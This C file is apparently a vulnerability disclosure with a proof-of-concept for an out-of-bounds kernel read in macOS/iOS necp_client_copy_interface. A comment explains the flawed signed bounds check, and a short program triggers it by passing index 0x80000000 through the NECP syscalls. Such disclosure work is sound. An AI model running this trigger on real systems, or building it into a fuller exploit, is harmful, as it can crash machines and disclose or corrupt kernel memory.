// ianbeer
#if 0
MacOS/iOS kernel memory corruption due to bad bounds checking in necp_client_copy_interface

necp_client_copy_interface contains this code where interface_index is an attacker controlled
uint32_t:

  if (interface_index != IFSCOPE_NONE && (int)interface_index <= if_index) {
    interface = ifindex2ifnet[interface_index];
  }

This leads to an interface pointer being read out of bounds. This can lead to kernel memory disclosure
and also memory corruption as a lock is taken on the interface object.

tested on MacOS 10.12.3 (16D32) on MacbookAir5,2
#endif

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <sys/syscall.h>

int necp_open(int flags) {
  return syscall(SYS_necp_open, flags);
}

int necp_client_action(int necp_fd, uint32_t action, uuid_t client_id, size_t client_id_len, uint8_t* buffer, size_t buffer_size) {
  return syscall(SYS_necp_client_action, necp_fd, action, client_id, client_id_len, buffer, buffer_size);
}

#define NECP_CLIENT_ACTION_COPY_INTERFACE 9

int main() {
  int fd = necp_open(0);

  uint32_t interface_id = 0x80000000;
  uint8_t buffer[100];
  necp_client_action(fd,
                     NECP_CLIENT_ACTION_COPY_INTERFACE,
                     &interface_id,
                     4,
                     buffer,
                     sizeof(buffer));

  printf("%d\n", fd);
  return 0;
}